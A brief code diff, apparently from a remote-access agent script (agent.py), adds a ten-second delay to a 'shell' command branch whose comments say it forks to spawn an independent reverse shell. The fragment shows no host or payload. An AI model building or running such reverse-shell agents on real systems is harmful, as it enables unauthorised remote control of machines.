@@ -150,6 +150,7 @@ def fetchCommand(ip):
         elif "shell" == command.split(' ')[0]:
             # Spawn an independent reverse shell through fork.
             # This fork will actually spawn a new agent.py 
+            time.sleep(10)
             try:
                 newpid = os.fork()
                 if newpid==0:
